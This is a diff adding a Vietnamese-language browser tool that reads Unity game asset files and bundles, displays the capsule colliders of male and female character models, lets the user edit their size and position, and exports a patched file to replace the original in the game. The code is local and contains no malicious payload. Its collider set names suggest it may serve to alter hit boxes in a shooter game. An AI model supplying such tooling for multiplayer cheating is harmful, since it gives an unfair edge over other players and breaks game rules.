+<li><b>Chọn file:</b> chạm vào khung nét đứt ở trên, chọn file Unity gốc (<code>.assets</code>, <code>.bundle</code>, <code>levelN</code>, <code>globalgamemanagers</code>) hoặc file dump <code>.txt</code>.</li>
+<li><b>Chọn nhân vật:</b> chạm nút <b>Nam</b> hoặc <b>Nữ</b>. Các collider của nhân vật đó hiện lên trên hình người, mỗi bộ phận một chip bên dưới.</li>
+<li><b>Chọn bộ phận:</b> chạm trực tiếp vào hình hoặc chạm chip tên bộ phận (Đầu, Ngực, Bụng, Cánh tay...). Bộ phận đang chọn được tô đậm kèm dấu +.</li>
+<li><b>Chỉnh thông số</b> ở bảng phía dưới: Radius (bán kính), Height (chiều cao), Tâm X/Y/Z, Hướng. Kéo thanh trượt hoặc gõ số trực tiếp. Hình cập nhật ngay.</li>
+<li><b>Bộ phận đã sửa</b> có dấu ● trên chip. Nút <b>Khôi phục gốc</b> trả bộ phận đang chọn về giá trị ban đầu.</li>
+<li><b>Làm đủ cả hai:</b> phải chỉnh ít nhất một collider của <b>Nam</b> và một collider của <b>Nữ</b> (hai nút đổi thành ✓). Chỉ khi đó nút <b>Tải file đã sửa</b> mới mở khóa.</li>
+<li><b>Xuất file:</b> bấm <b>Tải file đã sửa</b>, file mới có đuôi <code>_edited</code>. Thay file này vào game để dùng.</li>
+</ol>
+<div class="note">Mẹo: thanh "Tỉ lệ hình" chỉ phóng to hình cho dễ nhìn, không ảnh hưởng dữ liệu. Nếu sửa rồi trả về đúng giá trị gốc thì không tính là đã chỉnh. Hãy giữ lại một bản sao file gốc để dự phòng.</div>
+</div>
+</details>
+
+<div class="card" id="simCard" hidden>
+<div class="seg" id="chars"></div>
+<div class="gate" id="gate"></div>
+<div class="tabs" id="legend"></div>
+<canvas id="c0"></canvas>
+<div class="chips" id="parts"></div>
+<div class="tabs" style="margin:10px 0 0"><label>Tỉ lệ hình <input type="range" id="ks" min="1" max="3" step="0.1" value="2"> <span id="kv">×2.0</span></label></div>
+</div>
+
+<div class="card sheet" id="editor" hidden>
+<div class="eh"><b id="et"></b><button class="tab" id="fold">Thu gọn</button></div>
+<div id="eb">
+<div id="fields"></div>
+<div class="warn" id="warn" hidden></div>
+<div class="btns">
+<button class="b g" id="reset">Khôi phục gốc</button>
+<button class="b" id="dl">Tải file đã sửa</button>
+<button class="b g" id="cp">Sao chép toàn bộ</button>
+</div>
+<div class="msg" id="msg"></div>
+</div>
+</div>
+</main>
+<script>
+const DEF=['3844969807423664876','4273153183181864610'];
+const COL=['#0d9488','#ea580c','#7c3aed','#db2777'];
+const K=['x','y','z'];
+let text='',fname='1.txt',blocks=[],cols=[],act=0;
+const $=id=>document.getElementById(id);
+let bin=null;
+
+function parse(t){
+  text=t;blocks=[];
+  t.split(/(?=^pathid\s)/m).forEach(b=>{
+    const m=b.match(/^pathid\s+(-?\d+)/);
+    if(!m||!/CapsuleCollider/.test(b))return;
+    const f=n=>{const r=b.match(new RegExp('m_'+n+' = (\\S+)'));return r?parseFloat(r[1]):0};
+    const c=b.match(/m_Center[\s\S]*?float x = (\S+)[\s\S]*?float y = (\S+)[\s\S]*?float z = (\S+)/);
+    if(!c)return;
+    blocks.push({id:m[1],v:{r:f('Radius'),h:f('Height'),d:f('Direction'),x:+c[1],y:+c[2],z:+c[3]}});
+  });
+  bin=null;finish();
+}
+const PC={head:'#ef4444',torso:'#eab308',limb:'#14b8a6'};
+const VN={Head:'Đầu',Spine1:'Ngực',Spine:'Bụng',Hips:'Hông',Hips_Dummy:'Hông (phụ)',Clav:'Xương đòn',Arm:'Cánh tay',ForeArm:'Cẳng tay',Hand:'Bàn tay',LegUpper:'Đùi',Leg:'Cẳng chân',Ankle:'Bàn chân'};
+const BA={Head:[0,1.54,0,1],Spine1:[0,1,0,1],Spine:[0,1,0,1],Hips:[0,.95,0,1],Hips_Dummy:[0,.95,0,1],Clav:[.04,1.44,1,0],Arm:[.2,1.42,.2,-.98],ForeArm:[.254,1.155,.2,-.98],Hand:[.308,.89,.2,-.98],LegUpper:[.1,.92,0,-1],Leg:[.1,.5,0,-1],Ankle:[.1,.07,0,-1]};
+const SETN={Male_DTSCollider:'Nam',Female_DTSCollider:'Nữ',CapsuleHumanSniperCollider:'Sniper'};
+const BODY=[[0,1.63,0,1.69,.105],[0,1.52,0,1.58,.05],[0,1.3,0,1.4,.16],[0,1.08,0,1.16,.14],[0,.92,0,.98,.17],[-.2,1.43,.2,1.43,.05],
+[.2,1.42,.254,1.155,.045],[.254,1.155,.308,.89,.04],[.308,.89,.32,.78,.035],[-.2,1.42,-.254,1.155,.045],[-.254,1.155,-.308,.89,.04],[-.308,.89,-.32,.78,.035],
+[.1,.92,.105,.5,.08],[.105,.5,.1,.07,.055],[.1,.03,.12,.03,.05],[-.1,.92,-.105,.5,.08],[-.105,.5,-.1,.07,.055],[-.1,.03,-.12,.03,.05]];
+const LB=[['Đầu',-.05,1.68,-1],['Vai phải',-.12,1.46,-1],['Cánh tay phải',-.23,1.28,-1],['Cẳng tay phải',-.27,1.03,-1],['Bàn tay phải',-.31,.84,-1],['Đùi phải',-.1,.72,-1],['Cẳng chân phải',-.11,.3,-1],['Bàn chân phải',-.11,.03,-1],
+['Ngực',.12,1.36,1],['Bụng',.1,1.12,1],['Hông',.14,.95,1],['Vai trái',.12,1.46,1],['Cánh tay trái',.23,1.28,1],['Cẳng tay trái',.27,1.03,1],['Bàn tay trái',.31,.84,1],['Đùi trái',.1,.72,1],['Cẳng chân trái',.11,.3,1],['Bàn chân trái',.11,.03,1]];
+function meta(b){const m=/^bone_(Left|Right)?(.+)$/.exec(b.bone||'');return{key:m?m[2]:'',side:m?m[1]||'':''}}
+function colOf(b){const k=meta(b).key;return k==='Head'?PC.head:/^(Spine1?|Hips(_Dummy)?)$/.test(k)?PC.torso:PC.limb}
+function lab(b){const m=meta(b);return (SETN[b.set]||'?')+' · '+(VN[m.key]||b.bone||'?')+(m.side?(m.side==='Left'?' trái':' phải'):'')}
+function place(b,v,K){
+  const m=meta(b),A=BA[m.key];if(!A)return null;
+  const sg=m.side==='Right'?-1:1,ux=A[2]*sg,uy=A[3],r=v.r*K,L=Math.max(v.h,2*v.r)/2*K;
+  return{x:A[0]*sg-K*v.x*ux+K*v.z,y:A[1]-K*v.x*uy,r,L:v.d===1?r:L,ang:v.d===0?-Math.atan2(uy,ux):0};
+}
+function load(f){
+  if(!f)return;fname=f.name;
+  const rd=new FileReader();rd.onload=()=>{
+    const buf=rd.result;
+    if(String.fromCharCode(...new Uint8Array(buf,0,Math.min(6,buf.byteLength)))==='pathid')parse(new TextDecoder().decode(buf));
+    else parseBin(buf);
+  };rd.readAsArrayBuffer(f);
+}
+function scan(buf,base){
+  {
+    const dv=new DataView(buf);
+    const sig=new TextDecoder().decode(new Uint8Array(buf,0,Math.min(7,buf.byteLength)));
+    if(sig==='UnityFS'||sig==='UnityWe')throw new Error('Đây là file bundle nén (UnityFS), tool chưa đọc được. Hãy dùng file .assets, globalgamemanagers, levelN hoặc sharedassets.');
+    let p=4;const u32=()=>{const v=dv.getUint32(p);p+=4;return v};
+    p=8;const ver=u32();let dataOff=u32();
+    if(ver<16||ver>40)throw new Error('Không nhận ra định dạng file Unity (version '+ver+').');
+    let le=true;
+    if(ver>=9){le=dv.getUint8(p)===0;p+=4}
+    if(ver>=22){dataOff=Number(dv.getBigInt64(p+12));p+=28}
+    const i32=()=>{const v=dv.getInt32(p,le);p+=4;return v};
+    const i64=()=>{const v=dv.getBigInt64(p,le);p+=8;return v};
+    while(dv.getUint8(p++));
+    p+=4;
+    const tt=dv.getUint8(p++)!==0;
+    const tc=i32(),types=[];
+    for(let i=0;i<tc;i++){
+      const cid=i32();p+=1+2;
+      if(cid===114||cid<0)p+=16;
+      p+=16;
+      if(tt){const n=i32(),sb=i32();p+=n*(ver>=19?32:24)+sb;if(ver>=21){const dc=i32();p+=dc*4}}
+      types.push(cid);
+    }
+    const oc=i32(),OBJ=[],n0=blocks.length;
+    for(let i=0;i<oc;i++){
+      p=(p+3)&~3;
+      const pid=i64();
+      let start;if(ver>=22)start=Number(i64());else{start=dv.getUint32(p,le);p+=4}
+      const size=dv.getUint32(p,le);p+=4;
+      const ti=i32();if(ver===16)p++;
+      if(types[ti]===1||types[ti]===4)OBJ.push({c:types[ti],pid:String(pid),o:dataOff+start});
+      if(types[ti]!==136||size<24)continue;
+      const e=dataOff+start+size-24,f=o=>+dv.getFloat32(e+o,le).toPrecision(9);
+      blocks.push({id:String(pid),go:String(dv.getBigInt64(dataOff+start+4,le)),off:base+e,v:{r:f(0),h:f(4),d:dv.getInt32(e+8,le),x:f(12),y:f(16),z:f(20)}});
+    }
+    const G={},T={},g2t={};
+    OBJ.forEach(x=>{
+      if(x.c===1){const n=dv.getInt32(x.o,le),q=x.o+8+n*12,L=dv.getInt32(q,le);G[x.pid]=new TextDecoder().decode(new Uint8Array(buf,q+4,L))}
+      else{const n=dv.getInt32(x.o+52,le),go=String(dv.getBigInt64(x.o+4,le));T[x.pid]={go,f:String(dv.getBigInt64(x.o+60+n*12,le))};g2t[go]=x.pid}
+    });
+    for(let i=n0;i<blocks.length;i++){
+      const b=blocks[i];let t=g2t[b.go];b.bone=G[b.go]||'';
+      while(t&&T[T[t].f])t=T[t].f;
+      b.set=t?G[T[t].go]||'':'';
+    }
+    return le;
+  }
+}
+function lz4(src,n){
+  const out=new Uint8Array(n);let i=0,o=0;
+  while(i<src.length){
+    const t=src[i++];let l=t>>4;
+    if(l===15){let b;do{b=src[i++];l+=b}while(b===255)}
+    for(let k=0;k<l;k++)out[o++]=src[i++];
+    if(i>=src.length)break;
+    const off=src[i]|src[i+1]<<8;i+=2;
+    let m=t&15;if(m===15){let b;do{b=src[i++];m+=b}while(b===255)}
+    m+=4;for(let k=0;k<m;k++,o++)out[o]=out[o-off];
+  }
+  return out;
+}
+function unz(src,t,n){
+  if(t===0)return src;
+  if(t===2||t===3)return lz4(src,n);
+  throw new Error('Bundle nén LZMA, tool chỉ hỗ trợ bundle LZ4 hoặc không nén.');
+}
+function parseBin(buf){
+  blocks=[];bin=null;
+  try{
+    const u8=new Uint8Array(buf),dv=new DataView(buf);
+    if(new TextDecoder().decode(u8.subarray(0,7))!=='UnityFS'){const le=scan(buf,0);bin={buf,le};finish();return}
+    let p=8;const cstr=()=>{let s='';while(u8[p])s+=String.fromCharCode(u8[p++]);p++;return s};
+    const ver=dv.getUint32(p);p+=4;const uv=cstr(),rev=cstr();
+    p+=8;
+    const cs=dv.getUint32(p),us=dv.getUint32(p+4),fl=dv.getUint32(p+8);p+=12;
+    if(ver>=7||rev.startsWith('2019.4'))p=(p+15)&~15;
+    let bi;
+    if(fl&0x80)bi=u8.subarray(buf.byteLength-cs);
+    else{bi=u8.subarray(p,p+cs);p+=cs;if(fl&0x200)p=(p+15)&~15}
+    const info=unz(bi,fl&63,us),idv=new DataView(info.buffer,info.byteOffset,info.byteLength);
+    const hash=info.slice(0,16);let q=16;
+    const bc=idv.getInt32(q);q+=4;const bl=[];
+    for(let i=0;i<bc;i++){bl.push({u:idv.getUint32(q),c:idv.getUint32(q+4),t:idv.getUint16(q+8)&63});q+=10}
+    const nc=idv.getInt32(q);q+=4;const nodes=[];
+    for(let i=0;i<nc;i++){
+      const o=Number(idv.getBigInt64(q)),s=Number(idv.getBigInt64(q+8)),f=idv.getUint32(q+16);q+=20;
+      let n='';while(info[q])n+=String.fromCharCode(info[q++]);q++;nodes.push({o,s,f,n});
+    }
+    const data=new Uint8Array(bl.reduce((a,b)=>a+b.u,0));let w=0;
+    bl.forEach(b=>{data.set(unz(u8.subarray(p,p+b.c),b.t,b.u),w);w+=b.u;p+=b.c});
+    let le=true;
+    nodes.forEach(n=>{
+      if(/\.(resS|resource)$/.test(n.n))return;
+      try{le=scan(data.buffer.slice(n.o,n.o+n.s),n.o)}catch(e){}
+    });
+    if(!blocks.length)throw new Error('Không tìm thấy CapsuleCollider trong bundle.');
+    bin={buf:data.buffer,le,bundle:{ver,uv,rev,fl,nodes,hash}};
+    finish();
+  }catch(err){
+    $('dropTxt').textContent=fname+': '+err.message;
+    $('editor').hidden=$('simCard').hidden=true;
+  }
+}
+function pack(data){
+  const B=bin.bundle,enc=new TextEncoder();
+  let ni=0;B.nodes.forEach(n=>ni+=21+enc.encode(n.n).length);
+  const iz=34+ni,info=new Uint8Array(iz),idv=new DataView(info.buffer);
+  info.set(B.hash,0);idv.setInt32(16,1);idv.setUint32(20,data.byteLength);idv.setUint32(24,data.byteLength);idv.setUint16(28,0);idv.setInt32(30,B.nodes.length);
+  let q=34;
+  B.nodes.forEach(n=>{idv.setBigInt64(q,BigInt(n.o));idv.setBigInt64(q+8,BigInt(n.s));idv.setUint32(q+16,n.f);q+=20;const b=enc.encode(n.n);info.set(b,q);q+=b.length+1});
+  const h1=enc.encode('UnityFS\0'),uv=enc.encode(B.uv+'\0'),rv=enc.encode(B.rev+'\0');
+  const hl=h1.length+4+uv.length+rv.length+20;
+  const pad=(B.ver>=7||B.rev.startsWith('2019.4'))?(16-hl%16)%16:0;
+  const total=hl+pad+iz+data.byteLength,out=new Uint8Array(total),dv=new DataView(out.buffer);
+  let p=0;out.set(h1,p);p+=h1.length;dv.setUint32(p,B.ver);p+=4;out.set(uv,p);p+=uv.length;out.set(rv,p);p+=rv.length;
+  dv.setBigInt64(p,BigInt(total));dv.setUint32(p+8,iz);dv.setUint32(p+12,iz);dv.setUint32(p+16,B.fl&~0x2BF);
+  p=hl+pad;out.set(info,p);out.set(data,p+iz);
+  return out;
+}
+
+let ch='',sel='',hit=[];
+const chOf=b=>b.set||'';
+const sets=()=>[...new Set(blocks.map(chOf))];
+const chars=()=>sets().filter(s=>s!=='CapsuleHumanSniperCollider');
+const chName=s=>SETN[s]||s||'Tất cả';
+const chg=b=>['r','h','d','x','y','z'].some(k=>b.c[k]!==b.o[k]);
+const partName=b=>{const m=meta(b);return (VN[m.key]||b.bone)+(m.side?(m.side==='Left'?' trái':' phải'):'')};
+const edited=s=>blocks.some(b=>chOf(b)===s&&chg(b));
+const ready=()=>chars().length>0&&chars().every(edited);
+function gate(){
+  const ok=ready(),ss=chars();
+  $('gate').innerHTML=ss.map(s=>{const e=edited(s);return `<span class="gb${e?' ok':''}">${e?'✓':'○'} ${chName(s)}: ${e?'đã chỉnh':'chưa chỉnh'}</span>`}).join('')
+    +`<span class="gnote${ok?' ok':''}">${ok?'Đã đủ. Bạn có thể xuất file.':'Cần chỉnh sửa '+ss.filter(s=>!edited(s)).map(chName).join(' và ')+' trước khi xuất file.'}</span>`;
+  $('dl').disabled=!ok;$('cp').disabled=!ok;
+  $('dl').title=$('cp').title=ok?'':'Hãy chỉnh sửa cả Nam và Nữ trước';
+  if(!ok&&!$('msg').dataset.keep)$('msg').textContent='';
+}
+const nm=b=>b.bone?lab(b):'…'+b.id.slice(-6);
+const num=n=>String(+Number(n).toPrecision(9));
+
+function finish(){
+  $('cp').hidden=!!bin;
+  blocks.forEach(b=>{b.o={...b.v};b.c={...b.v}});
+  $('dropTxt').textContent=blocks.length?`${fname}: ${blocks.length} CapsuleCollider. Chạm để đổi file.`:`${fname}: không tìm thấy CapsuleCollider nào. Chọn file khác.`;
+  $('simCard').hidden=!blocks.length;$('editor').hidden=true;if(blocks.length)$('guide').open=false;
+  const ss=chars();
+  if(ss.length<2)pick(ss[0]||'');else{ch='';sel='';buildChars();buildParts();draw()}
+}
+function pick(s){
+  ch=s;const L=blocks.filter(b=>chOf(b)===s);
+  const d=L.find(b=>DEF.includes(b.id))||L.find(b=>meta(b).key==='Head')||L[0];
+  sel=d?d.id:'';
+  buildChars();buildParts();buildFields();draw();
+}
+function updChars(){
+  const bs=$('chars').children,ss=chars();
+  for(let i=0;i<bs.length;i++)bs[i].textContent=chName(ss[i])+(edited(ss[i])?' ✓':'');
+}
+function buildChars(){
+  const el=$('chars');el.innerHTML='';
+  chars().forEach(s=>{
+    const b=document.createElement('button');b.className='sg'+(s===ch?' on':'');b.textContent=chName(s)+(edited(s)?' ✓':'');
+    b.onclick=()=>pick(s===ch&&chars().length>1?'':s);el.appendChild(b);
+  });
+}
+function buildParts(){
+  const el=$('parts');el.innerHTML='';
+  gate();updChars();
+  if(!ch&&chars().length>1){el.innerHTML='<span class="hint">Chạm vào Nam hoặc Nữ ở trên để hiện các collider và tâm của nhân vật đó.</span>';return}
+  blocks.filter(b=>chOf(b)===ch).forEach(b=>{
+    const c=document.createElement('button');c.className='chip'+(b.id===sel?' on':'');
+    c.style.setProperty('--cc',colOf(b));
+    c.textContent=(chg(b)?'● ':'')+(b.bone?partName(b):'…'+b.id.slice(-6));
+    c.onclick=()=>{sel=b.id;buildParts();buildFields();draw()};el.appendChild(c);
+  });
+}
+function buildFields(){
+  const b=blocks.find(x=>x.id===sel);$('editor').hidden=!b;if(!b)return;
+  const v=b.c;
+  $('et').innerHTML=`<span class="dot" style="background:${colOf(b)}"></span>${nm(b)}`;
+  const F=$('fields');F.innerHTML='';
+  const upd=()=>{const w=v.h<2*v.r;$('warn').textContent=w?'Height nhỏ hơn 2×Radius: Unity sẽ tự nâng Height lên bằng 2×Radius.':'';$('warn').hidden=!w;buildParts();draw()};
+  [['r','Radius',0,Math.max(.5,v.r*3)],['h','Height',0,Math.max(1,v.h*3)],
+   ['x','Tâm X',-Math.max(.5,Math.abs(v.x)*2),Math.max(.5,Math.abs(v.x)*2)],
+   ['y','Tâm Y',-Math.max(.5,Math.abs(v.y)*2),Math.max(.5,Math.abs(v.y)*2)],
+   ['z','Tâm Z',-Math.max(.5,Math.abs(v.z)*2),Math.max(.5,Math.abs(v.z)*2)]].forEach(([k,lab,mn,mx])=>{
+    const r=document.createElement('div');r.className='row';
+    r.innerHTML=`<span>${lab}</span><input type="range" min="${mn}" max="${mx}" step="0.0005" value="${v[k]}"><input type="number" step="any" value="${v[k]}">`;
+    const [,sl,nu]=r.children;
+    sl.oninput=()=>{v[k]=+sl.value;nu.value=v[k];upd()};
+    nu.oninput=()=>{if(nu.value===''||isNaN(+nu.value))return;v[k]=+nu.value;sl.value=v[k];upd()};
+    F.appendChild(r);
+  });
+  const r=document.createElement('div');r.className='row';
+  r.innerHTML=`<span>Hướng</span><select><option value="0">0 · trục X</option><option value="1">1 · trục Y</option><option value="2">2 · trục Z</option></select><span></span>`;
+  const sl=r.children[1];sl.value=v.d;sl.onchange=()=>{v.d=+sl.value;upd()};
+  F.appendChild(r);upd();
+}
+function draw(){
+  $('legend').innerHTML=[['Đầu',PC.head],['Thân',PC.torso],['Tay chân',PC.limb]].map(x=>`<span><span class="dot" style="background:${x[1]}"></span>${x[0]}</span>`).join(' ');
+  view($('c0'));
+}
+function view(cv){
+  const K=+$('ks').value,dpr=window.devicePixelRatio||1,W=cv.clientWidth||300,H=Math.round(W*1.4);
+  cv.width=W*dpr;cv.height=H*dpr;cv.style.height=H+'px';
+  const g=cv.getContext('2d');g.setTransform(dpr,0,0,dpr,0,0);
+  const cs=getComputedStyle(document.documentElement),mut=cs.getPropertyValue('--mut'),s=H/2,X=w=>W/2+w*s,Y=w=>H*.96-w*s;
+  const seg=(q,col,al)=>{g.globalAlpha=al;g.strokeStyle=col;g.lineWidth=Math.max(2*q[4]*s,1);g.beginPath();g.moveTo(X(q[0]),Y(q[1]));g.lineTo(X(q[2]),Y(q[3]));g.stroke();g.globalAlpha=1};
+  g.lineCap='round';
+  BODY.forEach(q=>seg(q,cs.getPropertyValue('--body'),1));
+  g.fillStyle=mut;[-.04,.04].forEach(e=>{g.beginPath();g.arc(X(e),Y(1.68),.012*s,0,7);g.fill()});
+  g.strokeStyle=mut;g.lineWidth=1.5;g.beginPath();g.moveTo(X(-.03),Y(1.62));g.lineTo(X(.03),Y(1.62));g.stroke();
+  hit=[];
+  blocks.filter(b=>chOf(b)===ch).forEach(b=>{
+    const p=place(b,b.c,K);if(!p)return;
+    const on=b.id===sel,col=colOf(b);hit.push({b,p});
+    g.save();g.translate(X(p.x),Y(p.y));g.rotate(p.ang);
+    g.beginPath();g.roundRect(-p.L*s,-p.r*s,2*p.L*s,2*p.r*s,p.r*s);
+    if(on){g.fillStyle=col+'66';g.fill()}
+    g.lineWidth=on?4:1.5;g.globalAlpha=on?1:.6;g.strokeStyle=col;g.stroke();g.restore();g.globalAlpha=1;
+    const cx=X(p.x),cy=Y(p.y);
+    g.fillStyle=col;g.beginPath();g.arc(cx,cy,on?4.5:2.5,0,7);g.fill();
+    if(on){g.strokeStyle=col;g.lineWidth=1.5;g.beginPath();g.moveTo(cx-14,cy);g.lineTo(cx+14,cy);g.moveTo(cx,cy-14);g.lineTo(cx,cy+14);g.stroke()}
+  });
+  if(!ch&&chars().length>1){g.fillStyle=mut;g.font='13px system-ui';g.textAlign='center';g.fillText('Chọn Nam hoặc Nữ để hiện tâm',W/2,H*.5)}
+  g.font='10.5px system-ui';g.lineWidth=.8;g.textBaseline='middle';
+  LB.forEach(([t,tx,ty,sd])=>{
+    const y=Y(ty),lx=sd<0?86:W-86;
+    g.strokeStyle=mut;g.globalAlpha=.4;g.beginPath();g.moveTo(lx,y);g.lineTo(X(tx),y);g.stroke();g.globalAlpha=1;
+    g.fillStyle=mut;g.textAlign=sd<0?'left':'right';g.fillText(t,sd<0?6:W-6,y);
+  });
+  g.strokeStyle=mut;g.fillStyle=mut;g.lineWidth=2;g.textAlign='left';
+  g.beginPath();g.moveTo(10,16);g.lineTo(10+.1*K*s,16);g.stroke();g.fillText('0.1 đơn vị file',10,28);
+}
+$('c0').onclick=e=>{
+  const r=e.target.getBoundingClientRect(),W=r.width,H=Math.round(W*1.4),s=H/2,px=e.clientX-r.left,py=e.clientY-r.top;
+  let best=null,bd=14;
+  hit.forEach(({b,p})=>{
+    const dx=px-(W/2+p.x*s),dy=py-(H*.96-p.y*s),c=Math.cos(p.ang),sn=Math.sin(p.ang);
+    const lx=dx*c+dy*sn,ly=-dx*sn+dy*c,hl=Math.max(p.L-p.r,0)*s;
+    const d=Math.hypot(lx-Math.max(-hl,Math.min(hl,lx)),ly)-p.r*s;
+    if(d<bd){bd=d;best=b}
+  });
+  if(best){sel=best.id;buildParts();buildFields();draw()}
+};
+$('ks').oninput=()=>{$('kv').textContent='×'+(+$('ks').value).toFixed(1);draw()};
+$('fold').onclick=()=>{const x=$('eb');x.hidden=!x.hidden;$('fold').textContent=x.hidden?'Mở rộng':'Thu gọn'};
+$('reset').onclick=()=>{const b=blocks.find(x=>x.id===sel);if(b){b.c={...b.o};buildFields();buildParts();draw()}};
+function build(){
+  if(bin)return buildBin();
+  return text.split(/(?=^pathid\s)/m).map(t=>{
+    const m=t.match(/^pathid\s+(-?\d+)/);if(!m)return t;
+    const b=blocks.find(x=>x.id===m[1]);if(!b||!chg(b))return t;
+    const v=b.c;
+    return t.replace(/(float m_Radius = )\S+/,'$1'+num(v.r))
+      .replace(/(float m_Height = )\S+/,'$1'+num(v.h))
+      .replace(/(int m_Direction = )\S+/,'$1'+v.d)
+      .replace(/(m_Center[\s\S]*?float x = )\S+([\s\S]*?float y = )\S+([\s\S]*?float z = )\S+/,
+        (_,p,q,r)=>p+num(v.x)+q+num(v.y)+r+num(v.z));
+  }).join('');
+}
+function buildBin(){
+  const out=bin.buf.slice(0),dv=new DataView(out),le=bin.le;
+  blocks.filter(chg).forEach(b=>{
+    const o=b.off,v=b.c;
+    dv.setFloat32(o,v.r,le);dv.setFloat32(o+4,v.h,le);dv.setInt32(o+8,v.d,le);
+    dv.setFloat32(o+12,v.x,le);dv.setFloat32(o+16,v.y,le);dv.setFloat32(o+20,v.z,le);
+  });
+  return bin.bundle?pack(new Uint8Array(out)):out;
+}
+$('dl').onclick=()=>{
+  if(!ready()){$('msg').textContent='Cần chỉnh sửa cả Nam và Nữ trước khi xuất file.';return}
+  const n=blocks.filter(chg).length;
+  const a=document.createElement('a');
+  a.href=URL.createObjectURL(new Blob([build()],{type:'application/octet-stream'}));
+  a.download=/\.\w+$/.test(fname)?fname.replace(/(\.\w+)$/,'_edited$1'):fname+'_edited';a.click();
+  $('msg').textContent=`Đã tạo ${a.download} (${n} collider đã sửa)`;
+};
+$('cp').onclick=async()=>{
+  if(!ready()){$('msg').textContent='Cần chỉnh sửa cả Nam và Nữ trước khi xuất file.';return}
+  try{await navigator.clipboard.writeText(build());$('msg').textContent='Đã sao chép nội dung file đã sửa.'}
+  catch(e){$('msg').textContent='Không sao chép được, hãy dùng nút Tải file.'}
+};
+
+$('file').onchange=e=>load(e.target.files[0]);
+const dz=$('drop');
+['dragover','dragenter'].forEach(ev=>dz.addEventListener(ev,e=>{e.preventDefault();dz.classList.add('on')}));
+['dragleave','drop'].forEach(ev=>dz.addEventListener(ev,e=>{e.preventDefault();dz.classList.remove('on')}));
+dz.addEventListener('drop',e=>load(e.dataTransfer.files[0]));
+addEventListener('resize',()=>blocks.length&&draw());
+</script>
 </body>
 </html>
